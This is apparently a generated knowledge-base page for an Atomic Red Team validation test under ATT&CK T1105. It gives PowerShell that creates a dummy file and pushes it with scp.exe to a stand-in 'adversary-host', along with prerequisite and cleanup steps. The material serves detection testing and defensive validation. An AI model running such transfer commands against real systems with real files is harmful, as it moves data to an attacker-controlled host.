---
atomic_guid: "2a4b0d29-e5dd-4b66-b729-07423ba1cd9d"
title: "Windows push file using scp.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "2a4b0d29-e5dd-4b66-b729-07423ba1cd9d"
  - "Windows push file using scp.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test simulates pushing files using SCP on a Windows environment.

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Input Arguments

### file_name

- description: Name of the file to transfer
- type: string
- default: T1105.txt

### local_path

- description: Local path to copy from
- type: path
- default: C:\temp

### remote_host

- description: Remote host to send
- type: string
- default: adversary-host

### remote_path

- description: Path of folder to copy
- type: path
- default: /tmp/

### username

- description: User account to authenticate on remote host
- type: string
- default: adversary

## Dependencies

This test requires the `scp` command to be available on the system.

### Prerequisite Check

```powershell
if (Get-Command scp -ErrorAction SilentlyContinue) {
    Write-Output "SCP command is available."
    exit 0
} else {
    Write-Output "SCP command is not available."
    exit 1
}
```

### Get Prerequisite

```powershell
# Define the capability name for OpenSSH Client
$capabilityName = "OpenSSH.Client~~~~0.0.1.0"
try {
    # Install the OpenSSH Client capability
    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
    Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green
} catch {
    # Handle any errors that occur during the installation process
    Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red
}
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
# Check if the folder exists, create it if it doesn't
$folderPath = "#{local_path}"
if (-Not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}

# Create the file
$filePath = Join-Path -Path $folderPath -ChildPath "#{file_name}"
New-Item -Path $filePath -ItemType File -Force
Write-Output "File created: $filePath"

# Attack command
scp.exe #{local_path}\#{file_name} #{username}@#{remote_host}:#{remote_path}
```

### Cleanup

```powershell
$filePath = Join-Path -Path "#{local_path}" -ChildPath "#{file_name}"
Remove-Item -Path $filePath -Force -erroraction silentlycontinue
Write-Output "File deleted: $filePath"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
